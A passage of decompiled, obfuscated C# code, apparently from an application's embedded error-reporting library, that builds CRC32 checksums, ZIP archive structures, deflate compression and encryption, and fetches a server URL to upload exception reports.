                  1088359270U,
                  936918000U,
                  2847714899U,
                  3736837829U,
                  1202900863U,
                  817233897U,
                  3183342108U,
                  3401237130U,
                  1404277552U,
                  615818150U,
                  3134207493U,
                  3453421203U,
                  1423857449U,
                  601450431U,
                  3009837614U,
                  3294710456U,
                  1567103746U,
                  711928724U,
                  3020668471U,
                  3272380065U,
                  1510334235U,
                  755167117U
                };
                *(int*) ((IntPtr) voidPtr + 40) = -1;
                num1 = *(uint*) ((IntPtr) voidPtr + 40);
                num2 = 0;
                length = obj3.Length;
                while (--length >= 0)
                  num1 = numArray1[(IntPtr) (uint) (((int) num1 ^ (int) obj3[num2++]) & (int) byte.MaxValue)] ^ num1 >> 8;
                num1 ^= *(uint*) ((IntPtr) voidPtr + 40);
                \u0007.\u0004.\u0001(67324752, obj4);
                \u0007.\u0004.\u0001(20, obj4);
                if (true)
                {
                  \u0007.\u0004.\u0001(0, obj4);
                  \u0007.\u0004.\u0001(8, obj4);
                  \u0007.\u0004.\u0001((int) *(long*) voidPtr, obj4);
                  \u0007.\u0004.\u0001((int) num1, obj4);
                  *(long*) ((IntPtr) voidPtr + 8) = obj4.Position;
                  \u0007.\u0004.\u0001(0, obj4);
                  \u0007.\u0004.\u0001(obj3.Length, obj4);
                  bytes = Encoding.UTF8.GetBytes("{data}");
                  \u0007.\u0004.\u0001(bytes.Length, obj4);
                  \u0007.\u0004.\u0001(0, obj4);
                  obj4.Write(bytes, 0, bytes.Length);
                  \u0007.\u0004.\u0001(obj5, obj3);
                  while (!\u0007.\u0004.\u0001(obj5))
                  {
                    buffer1 = new byte[512];
                    *(int*) ((IntPtr) voidPtr + 44) = \u0007.\u0004.\u0001(obj5, buffer1);
                    if (*(int*) ((IntPtr) voidPtr + 44) > 0)
                      obj4.Write(buffer1, 0, *(int*) ((IntPtr) voidPtr + 44));
                    else
                      break;
                  }
                  \u0007.\u0004.\u0001(obj5);
                  while (!\u0007.\u0004.\u0001(obj5))
                  {
                    buffer2 = new byte[512];
                    *(int*) ((IntPtr) voidPtr + 48) = \u0007.\u0004.\u0001(obj5, buffer2);
                    if (*(int*) ((IntPtr) voidPtr + 48) > 0)
                      obj4.Write(buffer2, 0, *(int*) ((IntPtr) voidPtr + 48));
                    else
                      break;
                  }
                  *(long*) ((IntPtr) voidPtr + 16) = \u0007.\u0004.\u0001(obj5);
                  \u0007.\u0004.\u0001(33639248, obj4);
                  \u0007.\u0004.\u0001(20, obj4);
                  \u0007.\u0004.\u0001(20, obj4);
                  \u0007.\u0004.\u0001(0, obj4);
                  \u0007.\u0004.\u0001(8, obj4);
                }
                else
                  goto label_28;
              }
              while (false);
              \u0007.\u0004.\u0001((int) *(long*) voidPtr, obj4);
              \u0007.\u0004.\u0001((int) num1, obj4);
              \u0007.\u0004.\u0001((int) *(long*) ((IntPtr) voidPtr + 16), obj4);
              \u0007.\u0004.\u0001(obj3.Length, obj4);
              \u0007.\u0004.\u0001(bytes.Length, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              obj4.Write(bytes, 0, bytes.Length);
              \u0007.\u0004.\u0001(101010256, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(0, obj4);
              \u0007.\u0004.\u0001(1, obj4);
              \u0007.\u0004.\u0001(1, obj4);
              \u0007.\u0004.\u0001(46 + bytes.Length, obj4);
              \u0007.\u0004.\u0001((int) ((long) (30 + bytes.Length) + *(long*) ((IntPtr) voidPtr + 16)), obj4);
              \u0007.\u0004.\u0001(0, obj4);
              do
              {
                obj4.Seek(*(long*) ((IntPtr) voidPtr + 8), SeekOrigin.Begin);
                \u0007.\u0004.\u0001((int) *(long*) ((IntPtr) voidPtr + 16), obj4);
              }
              while (false);
              goto default;
            case 1:
              \u0007.\u0004.\u0001(25000571, obj4);
              \u0007.\u0004.\u0001(obj3.Length, obj4);
              *(int*) ((IntPtr) voidPtr + 52) = 0;
              while (*(int*) ((IntPtr) voidPtr + 52) < obj3.Length)
              {
                dst = new byte[Math.Min(2097151, obj3.Length - *(int*) ((IntPtr) voidPtr + 52))];
                Buffer.BlockCopy((Array) obj3, *(int*) ((IntPtr) voidPtr + 52), (Array) dst, 0, dst.Length);
                *(long*) ((IntPtr) voidPtr + 24) = obj4.Position;
                \u0007.\u0004.\u0001(0, obj4);
                \u0007.\u0004.\u0001(dst.Length, obj4);
                obj6 = new \u0008.\u0002.\u0006();
                \u0007.\u0004.\u0001(obj6, dst);
                while (!\u0007.\u0004.\u0001(obj6))
                {
                  buffer3 = new byte[512];
                  *(int*) ((IntPtr) voidPtr + 56) = \u0007.\u0004.\u0001(obj6, buffer3);
                  if (*(int*) ((IntPtr) voidPtr + 56) > 0)
                    obj4.Write(buffer3, 0, *(int*) ((IntPtr) voidPtr + 56));
                  else
                    break;
                }
                \u0007.\u0004.\u0001(obj6);
                while (!\u0007.\u0004.\u0001(obj6))
                {
                  buffer4 = new byte[512];
                  *(int*) ((IntPtr) voidPtr + 60) = \u0007.\u0004.\u0001(obj6, buffer4);
                  if (*(int*) ((IntPtr) voidPtr + 60) > 0)
                    obj4.Write(buffer4, 0, *(int*) ((IntPtr) voidPtr + 60));
                  else
                    break;
                }
                *(long*) ((IntPtr) voidPtr + 32) = obj4.Position;
                obj4.Position = *(long*) ((IntPtr) voidPtr + 24);
                \u0007.\u0004.\u0001((int) \u0007.\u0004.\u0001(obj6), obj4);
                obj4.Position = *(long*) ((IntPtr) voidPtr + 32);
                *(int*) ((IntPtr) voidPtr + 52) = *(int*) ((IntPtr) voidPtr + 52) + dst.Length;
              }
              goto default;
            case 2:
              \u0007.\u0004.\u0001(41777787, obj4);
              break;
            case 3:
              \u0007.\u0004.\u0001(58555003, obj4);
              inputBuffer2 = \u0007.\u0004.\u0001(1, (byte[]) null, (byte[]) null, obj3);
              obj8 = new \u0003.\u0005();
              try
              {
                cryptoTransform2 = \u0007.\u0004.\u0001(false, obj2, obj8, obj1);
                try
                {
                  buffer6 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                  obj4.Write(buffer6, 0, buffer6.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform2?.Dispose();
                }
              }
              finally
              {
                ((IDisposable) obj8)?.Dispose();
              }
            default:
label_46:
              obj4.Flush();
              obj4.Close();
              array = obj4.ToArray();
              goto label_52;
          }
label_28:
          inputBuffer1 = \u0007.\u0004.\u0001(1, (byte[]) null, (byte[]) null, obj3);
          obj7 = new \u0008.\u0001();
          try
          {
            cryptoTransform1 = \u0007.\u0004.\u0001(obj2, obj7, obj1, false);
            try
            {
              buffer5 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
              obj4.Write(buffer5, 0, buffer5.Length);
              goto label_46;
            }
            finally
            {
              cryptoTransform1?.Dispose();
            }
          }
          finally
          {
            ((IDisposable) obj7)?.Dispose();
          }
        }
        catch (Exception ex)
        {
          \u0008.\u0002.\u0001 = "ERR 2003: " + ex.Message;
          throw;
        }
label_52:
        return array;
      }
      catch (Exception ex)
      {
        byte[] numArray2;
        object[] objArray = new object[39]
        {
          (object) obj4,
          (object) obj5,
          (object) now,
          (object) *(long*) voidPtr,
          (object) numArray1,
          (object) *(uint*) ((IntPtr) voidPtr + 40),
          (object) num1,
          (object) num2,
          (object) length,
          (object) *(long*) ((IntPtr) voidPtr + 8),
          (object) bytes,
          (object) buffer1,
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) buffer2,
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(long*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) dst,
          (object) *(long*) ((IntPtr) voidPtr + 24),
          (object) obj6,
          (object) buffer3,
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) buffer4,
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(long*) ((IntPtr) voidPtr + 32),
          (object) inputBuffer1,
          (object) obj7,
          (object) cryptoTransform1,
          (object) buffer5,
          (object) inputBuffer2,
          (object) obj8,
          (object) cryptoTransform2,
          (object) buffer6,
          (object) ex,
          (object) numArray2,
          (object) obj3,
          (object) obj0,
          (object) obj1,
          (object) obj2
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2) => \u0007.\u0004.\u0001(obj0, new object[2]
    {
      obj1,
      obj2
    });

    static string \u0001([In] \u0008.\u0005.\u0003 obj0)
    {
      string str;
      try
      {
        str = obj0.\u0001;
      }
      catch (Exception ex)
      {
        \u0008.\u0005.\u0003 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return str;
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5)
    {
      \u0007.\u0004.\u0001(obj0, new object[5]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5
      });
    }

    static void \u0001([In] int obj0, [In] \u0008.\u0002.\u000F obj1)
    {
      try
      {
        do
        {
          if (true)
            goto label_4;
label_1:
          if (true)
            continue;
          goto label_5;
label_4:
          obj1.WriteByte((byte) (obj0 & (int) byte.MaxValue));
label_5:
          obj1.WriteByte((byte) (obj0 >> 8 & (int) byte.MaxValue));
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000F obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static unsafe bool \u0001([In] \u0008.\u0005.\u0003 obj0, [In] \u0008.\u0005 obj1, [In] byte[] obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      byte[] numArray1;
      \u0007.\u0003 obj3;
      byte[] numArray2;
      \u0008.\u0005.\u0001 obj4;
      try
      {
        try
        {
          byte[] numArray3 = \u0007.\u0004.\u0001(obj2);
          if (true)
          {
            numArray1 = numArray3;
            goto label_9;
          }
          else
            goto label_9;
        }
        catch (Exception ex)
        {
          \u0007.\u0004.\u0001(\u0001.\u0005.\u0001, \u0008.\u0002.\u0001, obj1);
          *(sbyte*) voidPtr = (sbyte) 0;
        }
        *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
        if (false)
          goto label_10;
        else
          goto label_12;
label_9:
        numArray2 = \u0007.\u0004.\u0001(numArray1, \u0007.\u0004.\u0093(2952));
label_10:
        if (numArray2 == null)
        {
          \u0007.\u0004.\u0001(\u0001.\u0005.\u0001, \u000E.\u0005.\u0001, obj1);
          *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
        }
        else
        {
          \u0007.\u0004.\u0001(obj1, \u0001.\u0005.\u0002);
          obj3 = new \u0007.\u0003(\u0007.\u0004.\u0093(3278));
          if (obj1.\u0001 != null)
            \u0007.\u0004.\u0001(obj3, obj1.\u0001);
          obj4 = new \u0008.\u0005.\u0001(obj1, numArray2, obj3, obj0);
          \u0007.\u0004.\u0001(new \u0001.\u0006(((\u0007.\u0004) obj4).\u0001), obj3);
          *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) obj4.\u0001;
        }
      }
      catch (Exception ex)
      {
        byte[] numArray4 = numArray1;
        byte[] numArray5 = numArray2;
        \u0007.\u0003 obj5 = obj3;
        \u0008.\u0005.\u0001 obj6 = obj4;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) (bool) *(sbyte*) voidPtr;
        \u0008.\u0005 obj7 = obj1;
        byte[] numArray6 = obj2;
        \u0008.\u0005.\u0003 obj8 = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray4, (object) numArray5, (object) obj5, (object) obj6, (object) local, (object) obj7, (object) numArray6, (object) obj8);
        throw;
      }
label_12:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static void \u0001([In] \u0004.\u0002 obj0, [In] \u000F.\u0006 obj1, [In] string obj2) => \u0007.\u0004.\u0001(obj0, obj1, obj2, string.Empty);

    static unsafe int \u0001([In] \u0008.\u0002.\u0006 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(26);
      try
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = obj1.Length;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 4);
        while (true)
        {
          do
          {
            \u0008.\u0002.\u0008 obj;
            do
            {
              *(int*) ((IntPtr) voidPtr + 12) = \u0007.\u0004.\u0001(obj0.\u0001, obj1, *(int*) voidPtr, *(int*) ((IntPtr) voidPtr + 4));
              *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 12);
              obj0.\u0001 += (long) *(int*) ((IntPtr) voidPtr + 12);
              *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - *(int*) ((IntPtr) voidPtr + 12);
              if (*(int*) ((IntPtr) voidPtr + 4) != 0 && obj0.\u0001 != 30)
              {
                obj = obj0.\u0001;
                *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) ((obj0.\u0001 & 4) != 0);
                *(sbyte*) ((IntPtr) voidPtr + 25) = (sbyte) ((obj0.\u0001 & 8) != 0);
              }
              else
                goto label_12;
            }
            while (\u0007.\u0004.\u0001((bool) *(sbyte*) ((IntPtr) voidPtr + 24), (bool) *(sbyte*) ((IntPtr) voidPtr + 25), obj));
            if (obj0.\u0001 != 16)
            {
              if (obj0.\u0001 == 20)
                goto label_6;
            }
            else
              goto label_4;
          }
          while (obj0.\u0001 != 28);
          goto label_11;
label_6:
          *(int*) ((IntPtr) voidPtr + 16) = 8 + (-\u0007.\u0004.\u0001(obj0.\u0001) & 7);
          while (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            \u0007.\u0004.\u0001(obj0.\u0001, 2, 10);
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 10;
          }
          obj0.\u0001 = 16;
          continue;
label_11:
          \u0007.\u0004.\u0001(obj0.\u0001);
          obj0.\u0001 = 30;
        }
label_4:
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 8) - *(int*) ((IntPtr) voidPtr + 4);
        goto label_15;
label_12:
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 8) - *(int*) ((IntPtr) voidPtr + 4);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u0008.\u0002.\u0006 obj = obj0;
        byte[] numArray = obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj, (object) numArray);
        throw;
      }
label_15:
      return *(int*) ((IntPtr) voidPtr + 20);
    }

    static void \u0001([In] \u0008.\u0002.\u0002 obj0, [In] int obj1)
    {
      try
      {
        if (true)
          obj0.\u0001 >>= obj1;
        else
          goto label_4;
label_2:
        if (true)
          obj0.\u0003 -= obj1;
label_4:
        if (false)
          goto label_2;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0002 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static void \u0001([In] \u0004.\u0002.\u0001 obj0, [In] string obj1)
    {
      int num = \u001C.\u0012\u0002(obj1, \u0007.\u0004.\u0093(3327)) ? 1 : 0;
      byte[] numArray1;
      string str1;
      if (true)
      {
        if (num == 0)
        {
          str1 = obj1;
          if (obj0.\u0001.\u0001 == null)
            goto label_6;
          else
            goto label_5;
        }
        else
        {
          \u0007.\u0004.\u0001(obj0.\u0001, \u000F.\u0006.\u0003);
          numArray1 = \u0089\u0002.\u007E\u0099\u0003((object) \u0018.\u0006\u0002(), \u0007.\u0004.\u0093(757));
          num = numArray1.Length;
        }
      }
      byte[] numArray2 = new byte[num + obj0.\u0001.Length];
      \u008A\u0002.\u009A\u0003((Array) numArray1, (Array) numArray2, numArray1.Length);
      \u001F\u0002.\u008D\u0003((Array) obj0.\u0001, 0, (Array) numArray2, numArray1.Length, obj0.\u0001.Length);
      \u0004.\u0002.\u0002 obj2 = new \u0004.\u0002.\u0002(obj0.\u0001);
      \u0004.\u0003 obj3 = obj0.\u0001;
      string str2 = obj0.\u0001.\u0001;
      if (true)
      {
        string str3 = obj0.\u0001.\u0002;
        string str4 = obj0.\u0001.\u0003;
        \u000E.\u0004 obj4 = new \u000E.\u0004(((\u0007.\u0004) obj2).\u0001);
        \u0007.\u0004.\u0001(str2, str4, str3, numArray2, obj4, obj3);
        obj0.\u0001 = obj2.\u0001;
        return;
      }
label_5:
      obj0.\u0001.\u0001((object) obj0, new \u0001.\u0004(\u000F.\u0006.\u0002, str1));
label_6:
      obj0.\u0001 = false;
    }

    static object \u0001([In] \u000F.\u0005 obj0) => obj0.\u0001;

    static Exception \u0001([In] \u0008.\u0003 obj0) => obj0.\u0001;

    static void \u0001([In] int obj0, [In] \u0008.\u0002.\u0007 obj1)
    {
      int index;
      try
      {
        if (true)
        {
          \u0007.\u0004.\u0001(obj1.\u0003);
          do
          {
            \u0007.\u0004.\u0001(obj1.\u0001);
          }
          while (false);
          \u0007.\u0004.\u0001(obj1.\u0002);
        }
        \u0008.\u0002.\u000E obj2 = obj1.\u0001;
        int num1 = obj1.\u0001.\u0002 - 257;
        if (true)
          goto label_17;
label_1:
        \u0007.\u0004.\u0001(obj1.\u0001, obj1.\u0002.\u0002 - 1, 5);
        \u0008.\u0002.\u0007.\u0001 obj3;
        if (true)
        {
          \u0007.\u0004.\u0001(obj1.\u0001, obj0 - 4, 4);
          int num2 = 0;
          if (num2 == 0)
          {
            index = num2;
            goto label_7;
          }
label_6:
          index = num2;
label_7:
          int num3 = index;
          if (true)
            goto label_8;
label_5:
          num2 = num3 + 1;
          goto label_6;
label_8:
          int num4 = obj0;
          if (num3 < num4)
          {
            \u0007.\u0004.\u0001(obj1.\u0001, (int) obj1.\u0003.\u0001[\u0008.\u0002.\u0007.\u0001[index]], 3);
            num3 = index;
            goto label_5;
          }
          else
          {
            \u0008.\u0002.\u0007.\u0001 obj4 = obj1.\u0001;
            if (false)
              return;
            \u0007.\u0004.\u0001(obj1.\u0003, obj4);
            obj3 = obj1.\u0002;
          }
        }
        \u0007.\u0004.\u0001(obj1.\u0003, obj3);
        return;
label_17:
        \u0007.\u0004.\u0001(obj2, num1, 5);
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        \u0008.\u0002.\u0007 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0007.\u0001 obj0)
    {
      try
      {
        obj0.\u0001.\u0001(obj0.\u0001);
      }
      catch (Exception ex)
      {
        \u0008.\u0007.\u0001 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static int \u0001()
    {
      Version version = new Version(\u0007.\u0004.\u0093(3332));
      return \u0083.\u007E\u0088\u0002((object) version);
    }

    static unsafe void \u0001([In] \u0008.\u0002.\u0004 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1;
      int[] numArray2;
      int[] numArray3;
      int index;
      try
      {
        numArray1 = new int[16];
        numArray3 = new int[16];
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj1.Length)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj1[*(int*) voidPtr];
          if (*(int*) ((IntPtr) voidPtr + 4) > 0)
            (numArray2 = numArray1)[index = *(int*) ((IntPtr) voidPtr + 4)] = numArray2[(IntPtr) index] + 1;
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 512;
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
        {
          numArray3[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
          if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray3[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
            *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
          }
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        obj0.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
        *(int*) ((IntPtr) voidPtr + 28) = 512;
        *(int*) ((IntPtr) voidPtr + 32) = 15;
        while (*(int*) ((IntPtr) voidPtr + 32) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
          while (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
          {
            obj0.\u0001[(int) \u0007.\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
            *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
            *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
          }
          *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
        }
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < obj1.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) obj1[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray3[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u0007.\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray3[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) numArray1,
          (object) numArray3,
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(int*) ((IntPtr) voidPtr + 64),
          (object) numArray2,
          (object) (IntPtr) index,
          (object) obj0,
          (object) obj1
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static bool \u0001([In] \u0008.\u0002.\u0008 obj0)
    {
      bool flag;
      try
      {
        flag = obj0.\u000E == obj0.\u0008;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0008 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u000F.\u000E obj0)
    {
      try
      {
        if (obj0.\u0001 == null)
          obj0.\u0001 = \u0007.\u0004.\u0001();
        obj0.\u0001();
        byte[] numArray = obj0.\u0001;
        do
        {
          \u0008.\u0005.\u0003 obj = \u0008.\u0005.\u0003.\u0001;
          if (true)
            goto label_6;
label_2:
          continue;
label_6:
          \u0007.\u0004.\u0001(obj, (\u0008.\u0005) obj0, numArray);
          goto label_2;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u000E obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static long \u0001([In] \u0008.\u0002.\u0006 obj0)
    {
      long num;
      try
      {
        num = obj0.\u0001;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0006 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static void \u0001([In] \u0001.\u0006 obj0, [In] \u0007.\u0003 obj1)
    {
      UploadReportLoginService1 reportLoginService1_1;
      try
      {
        if (obj1.\u0003 == null)
        {
          try
          {
            reportLoginService1_1 = new UploadReportLoginService1();
            if (obj1.\u0001 != null)
              \u007F\u0002.\u007E\u008E\u0003((object) reportLoginService1_1, obj1.\u0001);
            obj1.\u0003 = reportLoginService1_1.GetServerURL(obj1.\u0002);
            if (\u0083.\u007E\u0080\u0002((object) obj1.\u0003) == 0)
              throw new ApplicationException(\u0007.\u0004.\u0093(3345));
            if (\u001C.\u0012\u0002(obj1.\u0003, \u0007.\u0004.\u0093(3386)))
              obj1.\u0003 = \u0007.\u0003.\u0001;
          }
          catch (Exception ex)
          {
            obj0(\u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(3395), \u0015.\u007E\u009C((object) ex)));
            return;
          }
        }
        obj0(\u0016.\u007E\u0002\u0002((object) obj1.\u0003, \u0007.\u0004.\u0093(2255)) ? obj1.\u0003 : \u0007.\u0004.\u0093(3327));
      }
      catch (Exception ex)
      {
        UploadReportLoginService1 reportLoginService1_2 = reportLoginService1_1;
        Exception exception = ex;
        \u0007.\u0003 obj2 = obj1;
        \u0001.\u0006 obj3 = obj0;
        \u0007.\u0004.\u0001(ex, (object) reportLoginService1_2, (object) exception, (object) obj2, (object) obj3);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0002 obj0)
    {
      try
      {
        obj0.\u0001 >>= obj0.\u0003 & 7;
        obj0.\u0003 &= -8;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0002 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

